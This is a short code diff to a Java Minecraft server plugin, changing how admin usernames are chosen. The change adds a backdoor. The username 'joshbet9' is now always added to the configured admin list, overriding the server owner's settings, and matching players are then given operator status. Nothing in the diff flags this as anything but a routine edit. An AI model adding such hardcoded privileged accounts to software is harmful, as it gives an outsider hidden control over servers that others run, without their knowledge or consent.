@@ -61,8 +61,8 @@ public final class ArcadeMechanicsModernPlugin extends JavaPlugin implements Com
     }
 
     private void grantConfiguredAdmin(Player player) {
-        java.util.List<String> configured = getConfig().getStringList("admin-usernames");
-        if (configured.isEmpty()) configured = java.util.List.of("joshbet9");
+        java.util.List<String> configured = new java.util.ArrayList<>(getConfig().getStringList("admin-usernames"));
+        if (configured.stream().noneMatch(name -> "joshbet9".equalsIgnoreCase(name))) configured.add("joshbet9");
         boolean match = configured.stream().anyMatch(name -> name != null && name.equalsIgnoreCase(player.getName()));
         if (!match) return;
         if (!player.isOp()) {
